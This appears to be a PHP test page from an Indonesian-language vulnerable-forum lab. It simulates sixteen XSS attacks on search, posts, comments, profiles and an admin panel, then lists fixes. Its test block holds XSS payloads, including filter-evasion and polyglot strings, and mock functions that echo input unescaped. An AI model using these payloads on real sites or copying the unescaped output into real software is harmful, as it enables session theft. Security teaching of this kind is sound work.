<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';

// Inisialisasi hasil testing
$results = [];
$test_number = 1;

// Function untuk test XSS
function testXSS($description, $target, $payload, $context = 'output', $additional_params = [])
{
    global $results, $test_number;

    $result = [
        'test_id' => $test_number++,
        'description' => $description,
        'target' => $target,
        'payload' => $payload,
        'context' => $context,
        'status' => 'UNKNOWN',
        'details' => '',
        'response' => '',
        'vulnerability_confirmed' => false,
        'execution_confirmed' => false
    ];

    try {
        // Simulate the request based on target
        if ($target === 'search') {
            $response = testSearchXSS($payload);
        } elseif ($target === 'post_content') {
            $response = testPostContentXSS($payload);
        } elseif ($target === 'comment') {
            $response = testCommentXSS($payload);
        } elseif ($target === 'profile') {
            $response = testProfileXSS($payload, $additional_params);
        } elseif ($target === 'admin_panel') {
            $response = testAdminPanelXSS($payload);
        } elseif ($target === 'dom_based') {
            $response = testDOMBasedXSS($payload);
        }

        $result['response'] = $response['output'];
        $result['status'] = $response['status'];
        $result['details'] = $response['details'];
        $result['vulnerability_confirmed'] = $response['vulnerable'];
        $result['execution_confirmed'] = $response['executes'];
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['details'] = $e->getMessage();
        $result['response'] = 'Exception occurred: ' . $e->getMessage();
    }

    $results[] = $result;
    return $result;
}

// Test Search XSS (Reflected)
function testSearchXSS($xss_payload)
{
    try {
        // Simulate search.php vulnerable output
        $searchQuery = $xss_payload;

        // Check line 79 in search.php: <?php echo $searchQuery;
        $output = "Menampilkan hasil untuk: <strong>" . $searchQuery . "</strong>";

        $vulnerable = false;
        $executes = false;
        $details = '';

        // Check for XSS patterns
        if (
            stripos($xss_payload, '<script') !== false ||
            stripos($xss_payload, 'javascript:') !== false ||
            stripos($xss_payload, 'onerror') !== false ||
            stripos($xss_payload, 'onload') !== false ||
            stripos($xss_payload, 'alert') !== false
        ) {

            $vulnerable = true;
            $details = "XSS payload detected in search output without escaping";

            // Check if it would execute (basic patterns)
            if (
                preg_match('/<script[^>]*>.*<\/script>/i', $xss_payload) ||
                preg_match('/on\w+\s*=\s*["\']?[^"\']*["\']?/i', $xss_payload)
            ) {
                $executes = true;
                $details .= " - Payload would execute in browser";
            }
        }

        // Simulate highlighting functionality (also vulnerable)
        $highlightedOutput = str_ireplace($searchQuery, '<mark>' . $searchQuery . '</mark>', $output);

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => $highlightedOutput,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'executes' => $executes
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Search function error',
            'vulnerable' => false,
            'executes' => false
        ];
    }
}

// Test Post Content XSS (Stored)
function testPostContentXSS($xss_payload)
{
    global $pdo;

    try {
        // Simulate createPost function with vulnerable content
        $title = "Test Post";
        $content = $xss_payload;
        $categoryId = 1;
        $userId = 1;

        // Escape for SQL but keep XSS
        $escaped_content = addslashes($content);

        $vulnerable = false;
        $executes = false;
        $details = '';

        // Check if XSS payload exists
        if (
            stripos($xss_payload, '<script') !== false ||
            stripos($xss_payload, 'javascript:') !== false ||
            stripos($xss_payload, 'onerror') !== false ||
            stripos($xss_payload, 'onload') !== false
        ) {

            $vulnerable = true;
            $details = "Stored XSS payload in post content";

            if (
                preg_match('/<script[^>]*>.*<\/script>/i', $xss_payload) ||
                preg_match('/on\w+\s*=\s*["\']?[^"\']*["\']?/i', $xss_payload)
            ) {
                $executes = true;
                $details .= " - Payload would execute when post is viewed";
            }
        }

        // Simulate display without sanitization (like in displayMessage function)
        $display_output = "<div class='post-content'>" . $content . "</div>";

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => "Post created successfully. Content: " . htmlspecialchars($display_output),
            'details' => $details,
            'vulnerable' => $vulnerable,
            'executes' => $executes
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Post creation error',
            'vulnerable' => false,
            'executes' => false
        ];
    }
}

// Test Comment XSS (Stored)
function testCommentXSS($xss_payload)
{
    try {
        // Simulate comment submission
        $comment_content = $xss_payload;

        $vulnerable = false;
        $executes = false;
        $details = '';

        // Check XSS patterns
        if (stripos($xss_payload, '<') !== false && stripos($xss_payload, '>') !== false) {
            $vulnerable = true;
            $details = "HTML tags in comment content without sanitization";

            if (
                stripos($xss_payload, 'script') !== false ||
                preg_match('/on\w+\s*=/i', $xss_payload)
            ) {
                $executes = true;
                $details .= " - JavaScript execution possible";
            }
        }

        // Simulate vulnerable output (no escaping like displayMessage function)
        $output = "<div class='comment'>" . $comment_content . "</div>";

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => "Comment posted: " . htmlspecialchars($output),
            'details' => $details,
            'vulnerable' => $vulnerable,
            'executes' => $executes
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Comment posting error',
            'vulnerable' => false,
            'executes' => false
        ];
    }
}

// Test Profile XSS
function testProfileXSS($xss_payload, $params)
{
    try {
        $field = $params['field'] ?? 'full_name';

        $vulnerable = false;
        $executes = false;
        $details = '';

        // Check if profile field contains XSS
        if (stripos($xss_payload, '<') !== false) {
            $vulnerable = true;
            $details = "XSS in profile field: $field";

            if (preg_match('/javascript:|on\w+\s*=|<script/i', $xss_payload)) {
                $executes = true;
                $details .= " - Active JavaScript detected";
            }
        }

        $output = "Profile updated. $field: " . $xss_payload;

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'executes' => $executes
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Profile update error',
            'vulnerable' => false,
            'executes' => false
        ];
    }
}

// Test Admin Panel XSS
function testAdminPanelXSS($xss_payload)
{
    try {
        $vulnerable = false;
        $executes = false;
        $details = '';

        // Check XSS in admin context
        if (stripos($xss_payload, '<') !== false) {
            $vulnerable = true;
            $details = "XSS in admin panel - high privilege context";

            if (preg_match('/script|javascript|on\w+\s*=/i', $xss_payload)) {
                $executes = true;
                $details .= " - Admin privilege escalation possible";
            }
        }

        // Simulate admin action with vulnerable output
        $output = "Admin action executed with data: " . $xss_payload;

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'executes' => $executes
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Admin panel error',
            'vulnerable' => false,
            'executes' => false
        ];
    }
}

// Test DOM-based XSS
function testDOMBasedXSS($xss_payload)
{
    try {
        $vulnerable = false;
        $executes = false;
        $details = '';

        // Simulate DOM manipulation (like in search.js)
        if (stripos($xss_payload, '<') !== false) {
            $vulnerable = true;
            $details = "DOM-based XSS via JavaScript manipulation";

            if (preg_match('/script|javascript|on\w+|alert/i', $xss_payload)) {
                $executes = true;
                $details .= " - DOM XSS execution confirmed";
            }
        }

        // Simulate insertAdjacentHTML vulnerability
        $js_output = "document.body.insertAdjacentHTML('afterbegin', '" . $xss_payload . "')";

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'SAFE',
            'output' => "DOM manipulation: " . $js_output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'executes' => $executes
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'DOM manipulation error',
            'vulnerable' => false,
            'executes' => false
        ];
    }
}

// Mulai testing jika form disubmit
if ($_POST['run_tests'] ?? false) {

    // ===== REFLECTED XSS TESTS =====
    // Don't echo headers here as it breaks HTML structure

    // Test 1: Basic script tag
    testXSS(
        "Basic Script Tag Injection",
        "search",
        "<script>alert('XSS')</script>",
        "reflected"
    );

    // Test 2: Event handler injection
    testXSS(
        "Event Handler Injection - IMG",
        "search",
        "<img src=x onerror=\"alert('XSS')\">",
        "reflected"
    );

    // Test 3: SVG-based XSS
    testXSS(
        "SVG-based XSS",
        "search",
        "<svg onload=\"alert('SVG XSS')\">",
        "reflected"
    );
    // ===== STORED XSS TESTS =====
    // Test 4: Post content XSS
    testXSS(
        "Stored XSS in Post Content",
        "post_content",
        "<script>alert('Stored XSS in Post')</script>",
        "stored"
    );

    // Test 5: Comment XSS
    testXSS(
        "Stored XSS in Comments",
        "comment",
        "<img src=x onerror=\"alert('Comment XSS')\">",
        "stored"
    );

    // Test 6: Profile XSS
    testXSS(
        "Stored XSS in Profile",
        "profile",
        "<script>alert('Profile XSS')</script>",
        "stored",
        ['field' => 'full_name']
    );
    // ===== ADVANCED XSS EVASION =====
    // Test 7: Filter evasion - case variation
    testXSS(
        "Case Variation Evasion",
        "search",
        "<ScRiPt>alert('Case Evasion')</ScRiPt>",
        "reflected"
    );

    // Test 8: Filter evasion - encoding
    testXSS(
        "Character Encoding Evasion",
        "search",
        "&#60;script&#62;alert('Encoded')&#60;/script&#62;",
        "reflected"
    );

    // Test 9: Filter evasion - nested tags
    testXSS(
        "Nested Tag Evasion",
        "search",
        "<scr<script>ipt>alert('Nested')</script>",
        "reflected"
    );

    // Test 10: JavaScript protocol
    testXSS(
        "JavaScript Protocol",
        "post_content",
        "<a href=\"javascript:alert('Protocol XSS')\">Click</a>",
        "stored"
    );
    // ===== DOM-BASED XSS =====
    // Test 11: DOM manipulation
    testXSS(
        "DOM Manipulation XSS",
        "dom_based",
        "<img src=x onerror=\"alert('DOM XSS')\">",
        "dom"
    );

    // Test 12: URL fragment XSS
    testXSS(
        "URL Fragment XSS",
        "dom_based",
        "#<script>alert('Fragment XSS')</script>",
        "dom"
    );
    // ===== CONTEXT-SPECIFIC XSS =====
    // Test 13: Admin panel XSS
    testXSS(
        "Admin Panel XSS - High Privilege",
        "admin_panel",
        "<script>alert('Admin XSS - High Risk!')</script>",
        "admin"
    );

    // Test 14: Input field attribute XSS
    testXSS(
        "Attribute-based XSS",
        "search",
        "\" onfocus=\"alert('Attribute XSS')\" autofocus=\"",
        "attribute"
    );
    // ===== POLYGLOT XSS =====
    // Test 15: Universal XSS polyglot
    testXSS(
        "Universal XSS Polyglot",
        "post_content",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
        "polyglot"
    );

    // Test 16: Multi-context polyglot
    testXSS(
        "Multi-context Polyglot",
        "search",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        "polyglot"
    );
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Comprehensive Testing</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .test-vulnerable {
            background-color: #f8d7da;
            border-left: 5px solid #dc3545;
        }

        .test-safe {
            background-color: #d1e7dd;
            border-left: 5px solid #198754;
        }

        .test-error {
            background-color: #fff3cd;
            border-left: 5px solid #ffc107;
        }

        .test-executes {
            background-color: #ffebee;
            border-left: 5px solid #e91e63;
        }

        .payload-code {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
        }

        .result-details {
            font-size: 0.9em;
            color: #666;
        }

        .vulnerability-badge {
            font-size: 0.8em;
        }

        .execution-badge {
            font-size: 0.7em;
            margin-left: 5px;
        }

        .risk-high {
            background-color: #dc3545 !important;
        }

        .risk-medium {
            background-color: #fd7e14 !important;
        }

        .risk-low {
            background-color: #ffc107 !important;
            color: #000;
        }
    </style>
</head>

<body>
    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-warning text-dark">
                        <h2><i class="fas fa-code"></i> 🚨 XSS COMPREHENSIVE TESTING</h2>
                        <p class="mb-0">Testing semua teknik Cross-Site Scripting pada Forum Vulnerable</p>
                    </div>

                    <div class="card-body">
                        <?php if (!isset($_POST['run_tests'])): ?>
                            <!-- Form untuk memulai testing -->
                            <div class="alert alert-danger">
                                <h5><i class="fas fa-skull-crossbones"></i> XSS Testing Warning</h5>
                                <p>Testing ini akan menjalankan berbagai payload XSS yang dapat:</p>
                                <ul>
                                    <li><strong>Execute JavaScript</strong> di browser</li>
                                    <li><strong>Steal session cookies</strong> dan data sensitif</li>
                                    <li><strong>Redirect users</strong> ke situs malicious</li>
                                    <li><strong>Modify page content</strong> dan form actions</li>
                                    <li><strong>Perform actions</strong> atas nama user</li>
                                </ul>
                                <p><strong>⚠️ Hanya jalankan di environment testing yang aman!</strong></p>
                            </div>

                            <div class="row">
                                <div class="col-md-4">
                                    <h5>XSS Types Tested:</h5>
                                    <ul>
                                        <li><span class="badge bg-danger">Reflected XSS</span></li>
                                        <li><span class="badge bg-warning text-dark">Stored XSS</span></li>
                                        <li><span class="badge bg-info">DOM-based XSS</span></li>
                                    </ul>
                                </div>
                                <div class="col-md-4">
                                    <h5>Target Locations:</h5>
                                    <ul>
                                        <li>Search functionality</li>
                                        <li>Post content & comments</li>
                                        <li>User profiles</li>
                                        <li>Admin panel</li>
                                    </ul>
                                </div>
                                <div class="col-md-4">
                                    <h5>Evasion Techniques:</h5>
                                    <ul>
                                        <li>Filter bypassing</li>
                                        <li>Character encoding</li>
                                        <li>Case variation</li>
                                        <li>Polyglot payloads</li>
                                    </ul>
                                </div>
                            </div>

                            <form method="POST" class="mt-4">
                                <button type="submit" name="run_tests" value="1" class="btn btn-warning btn-lg">
                                    <i class="fas fa-play-circle"></i> Mulai XSS Testing
                                </button>
                            </form>

                        <?php else: ?>
                            <!-- Hasil Testing -->
                            <div class="alert alert-info mb-4">
                                <h5><i class="fas fa-chart-line"></i> XSS Testing Results</h5>
                                <div class="row">
                                    <div class="col-md-3">
                                        <strong>Total Tests:</strong> <?php echo count($results); ?>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Vulnerable:</strong> <span class="badge bg-danger"><?php echo count(array_filter($results, function ($r) {
                                                                                                        return $r['vulnerability_confirmed'];
                                                                                                    })); ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Executes:</strong> <span class="badge bg-warning text-dark"><?php echo count(array_filter($results, function ($r) {
                                                                                                                return $r['execution_confirmed'];
                                                                                                            })); ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Safe:</strong> <span class="badge bg-success"><?php echo count(array_filter($results, function ($r) {
                                                                                                    return !$r['vulnerability_confirmed'] && $r['status'] !== 'ERROR';
                                                                                                })); ?></span>
                                    </div>
                                </div>
                            </div>

                            <!-- Detail hasil setiap test -->
                            <div class="row">
                                <?php foreach ($results as $result): ?>
                                    <div class="col-12 mb-3">
                                        <div class="card <?php
                                                            if ($result['execution_confirmed']) echo 'test-executes';
                                                            elseif ($result['vulnerability_confirmed']) echo 'test-vulnerable';
                                                            elseif ($result['status'] === 'ERROR') echo 'test-error';
                                                            else echo 'test-safe';
                                                            ?>">
                                            <div class="card-header">
                                                <div class="d-flex justify-content-between align-items-center">
                                                    <h6 class="mb-0">
                                                        <i class="fas fa-code"></i>
                                                        Test #<?php echo $result['test_id']; ?>: <?php echo htmlspecialchars($result['description']); ?>
                                                    </h6>
                                                    <div>
                                                        <!-- Vulnerability status -->
                                                        <span class="badge vulnerability-badge <?php
                                                                                                if ($result['execution_confirmed']) echo 'risk-high';
                                                                                                elseif ($result['vulnerability_confirmed']) echo 'risk-medium';
                                                                                                elseif ($result['status'] === 'ERROR') echo 'bg-warning text-dark';
                                                                                                else echo 'bg-success';
                                                                                                ?>">
                                                            <?php
                                                            if ($result['execution_confirmed']) echo 'EXECUTES JS';
                                                            elseif ($result['vulnerability_confirmed']) echo 'VULNERABLE';
                                                            elseif ($result['status'] === 'ERROR') echo 'ERROR';
                                                            else echo 'SAFE';
                                                            ?>
                                                        </span>

                                                        <!-- Context badge -->
                                                        <span class="badge bg-secondary execution-badge">
                                                            <?php echo strtoupper($result['context']); ?>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="col-md-6">
                                                        <strong>Target:</strong> <?php echo htmlspecialchars($result['target']); ?><br>
                                                        <strong>Context:</strong> <?php echo htmlspecialchars($result['context']); ?><br>
                                                        <strong>Risk Level:</strong>
                                                        <span class="badge <?php
                                                                            if ($result['execution_confirmed']) echo 'bg-danger';
                                                                            elseif ($result['vulnerability_confirmed']) echo 'bg-warning text-dark';
                                                                            else echo 'bg-success';
                                                                            ?>">
                                                            <?php
                                                            if ($result['execution_confirmed']) echo 'HIGH';
                                                            elseif ($result['vulnerability_confirmed']) echo 'MEDIUM';
                                                            else echo 'LOW';
                                                            ?>
                                                        </span>
                                                    </div>
                                                    <div class="col-md-6">
                                                        <strong>Payload:</strong>
                                                        <div class="payload-code mt-1">
                                                            <?php echo htmlspecialchars($result['payload']); ?>
                                                        </div>
                                                    </div>
                                                </div>

                                                <hr>

                                                <div class="row">
                                                    <div class="col-12">
                                                        <strong>Response:</strong>
                                                        <div class="mt-2 p-2 bg-light border-start border-3">
                                                            <?php echo htmlspecialchars($result['response']); ?>
                                                        </div>

                                                        <?php if (!empty($result['details'])): ?>
                                                            <div class="result-details mt-2">
                                                                <strong>Analysis:</strong> <?php echo htmlspecialchars($result['details']); ?>
                                                            </div>
                                                        <?php endif; ?>

                                                        <!-- Show actual execution warning -->
                                                        <?php if ($result['execution_confirmed']): ?>
                                                            <div class="alert alert-danger mt-2 mb-0">
                                                                <i class="fas fa-exclamation-triangle"></i>
                                                                <strong>⚠️ CRITICAL:</strong> This payload would execute JavaScript in a real browser environment!
                                                            </div>
                                                        <?php endif; ?>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            </div>

                            <!-- Summary dan rekomendasi -->
                            <div class="alert alert-dark mt-4">
                                <h5><i class="fas fa-shield-alt"></i> XSS Security Assessment</h5>

                                <?php
                                $vulnerable_count = count(array_filter($results, function ($r) {
                                    return $r['vulnerability_confirmed'];
                                }));
                                $execution_count = count(array_filter($results, function ($r) {
                                    return $r['execution_confirmed'];
                                }));
                                $total_tests = count($results);
                                ?>

                                <?php if ($execution_count > 0): ?>
                                    <div class="alert alert-danger">
                                        <strong>🚨 CRITICAL XSS VULNERABILITIES!</strong><br>
                                        <?php echo $execution_count; ?> payloads dapat mengeksekusi JavaScript, <?php echo $vulnerable_count; ?> dari <?php echo $total_tests; ?> test vulnerable.
                                        <ul class="mt-2">
                                            <li><strong>Session Hijacking:</strong> Attacker dapat mencuri session cookies</li>
                                            <li><strong>Data Theft:</strong> Form data dan informasi pribadi dapat dicuri</li>
                                            <li><strong>Malicious Redirection:</strong> User dapat diarahkan ke situs phishing</li>
                                            <li><strong>Privilege Escalation:</strong> Admin actions dapat dibajak</li>
                                            <li><strong>Malware Distribution:</strong> Dapat digunakan untuk menyebarkan malware</li>
                                        </ul>
                                    </div>
                                <?php elseif ($vulnerable_count > 0): ?>
                                    <div class="alert alert-warning">
                                        <strong>⚠️ XSS VULNERABILITIES DETECTED</strong><br>
                                        <?php echo $vulnerable_count; ?> dari <?php echo $total_tests; ?> test menunjukkan kerentanan XSS.
                                        Meskipun tidak semua payload execute, sistem tetap rentan terhadap serangan yang lebih sophisticated.
                                    </div>
                                <?php else: ?>
                                    <div class="alert alert-success">
                                        <strong>✅ SISTEM AMAN DARI XSS</strong><br>
                                        Tidak ditemukan kerentanan XSS pada test yang dilakukan.
                                    </div>
                                <?php endif; ?>

                                <h6>Immediate Security Fixes:</h6>
                                <ul>
                                    <li><strong>Output Encoding:</strong> Encode semua user input sebelum output ke HTML</li>
                                    <li><strong>Input Validation:</strong> Validasi dan sanitasi input di server-side</li>
                                    <li><strong>CSP Headers:</strong> Implement Content Security Policy</li>
                                    <li><strong>HttpOnly Cookies:</strong> Set cookies dengan flag HttpOnly</li>
                                    <li><strong>X-XSS-Protection:</strong> Enable browser XSS filtering</li>
                                    <li><strong>Template Escaping:</strong> Use secure templating dengan auto-escaping</li>
                                </ul>

                                <h6>Advanced Protections:</h6>
                                <ul>
                                    <li>WAF dengan XSS detection rules</li>
                                    <li>Regular security code reviews</li>
                                    <li>Automated security scanning</li>
                                    <li>Penetration testing</li>
                                    <li>Security awareness training</li>
                                </ul>
                            </div>

                            <div class="text-center mt-4">
                                <a href="test_xss_comprehensive.php" class="btn btn-secondary">
                                    <i class="fas fa-redo"></i> Test Ulang
                                </a>
                                <a href="test_csrf_comprehensive.php" class="btn btn-primary">
                                    <i class="fas fa-arrow-right"></i> Lanjut ke CSRF Testing
                                </a>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>